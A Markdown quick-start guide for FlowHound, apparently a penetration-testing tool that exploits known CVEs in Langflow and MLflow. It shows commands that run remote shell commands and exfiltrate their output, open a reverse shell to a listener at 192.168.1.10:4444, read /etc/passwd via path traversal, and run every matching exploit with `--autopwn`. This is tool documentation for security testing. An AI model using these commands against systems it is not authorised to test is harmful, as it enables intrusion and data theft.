# Quick Start

This guide walks you from a clean installation to your first successful FlowHound run.

---

## 1. Install FlowHound

```bash
pip install .
```

Verify the CLI is available:

```bash
flowhound --help
```

---

## 2. Detect the target version

The `sniff` command probes the target, reports the application and version, and lists all known CVEs that apply — **without launching any exploits or scans**.

```bash
flowhound sniff --url http://TARGET:7860
```

Example output (Langflow):

```
[+] Detected langflow version 1.0.0.
[+] Retrieving all known modules for langflow version 1.0.0:
[+] [exploit] flowhound.vulnerabilities.exploits.langflow.cve_2026_9198
[+] [exploit] flowhound.vulnerabilities.exploits.langflow.cve_2026_19295
...
```

For MLflow, pass `--application` to skip auto-detection:

```bash
flowhound sniff --url http://TARGET:5000 --application mlflow
```

Use `sniff` first to confirm the target is reachable and to understand which modules apply before proceeding with an attack or scan.

---

## 3. Run an unauthenticated attack

```bash
flowhound attack --url http://TARGET:7860
```

FlowHound will:

1. Detect the application and version.
2. Query the vulnerability database for applicable exploit CVEs (unauthenticated only).
3. Run the highest-priority exploit and stop on the first success.

To target Langflow directly and skip auto-detection:

```bash
flowhound attack --url http://TARGET:7860 --application langflow
```

---

## 4. Run an authenticated attack

Supply credentials to unlock the authenticated exploit modules:

```bash
flowhound attack --url http://TARGET:7860 --username admin --password secret
```

`--username` and `--password` must always be supplied together.

---

## 5. Use a custom payload

Run a specific shell command and exfiltrate the output:

```bash
flowhound attack --url http://TARGET:7860 --command "whoami"
```

Open a reverse TCP shell (requires a listener on `LHOST:LPORT`):

```bash
flowhound attack --url http://TARGET:7860 --reverse_shell 192.168.1.10:4444
```

`--command` and `--reverse_shell` are mutually exclusive.

---

## 6. Target a specific CVE

Use `--cve` to limit execution to a single named CVE:

```bash
flowhound attack --url http://TARGET:7860 --cve CVE-2026-9198
```

---

## 7. Run an auxiliary scan

To execute auxiliary modules (such as path traversal file disclosure):

```bash
flowhound scan --url http://TARGET:5000 --cve CVE-2023-1177 --f_path /etc/passwd
```

---

## 8. Run all matching exploits

By default FlowHound stops at the first successful exploit. Use `--autopwn` to run every applicable exploit:

```bash
flowhound attack --url http://TARGET:7860 --autopwn
```

---

## Next steps

- [CLI Overview](usage.md) — complete option reference for all commands.
- [Attack](attack.md) — detailed explanation of the attack workflow.
- [Scan](scan.md) — auxiliary module scanning.
- [Vulnerability Database](vulnerabilities.md) — full CVE coverage list.
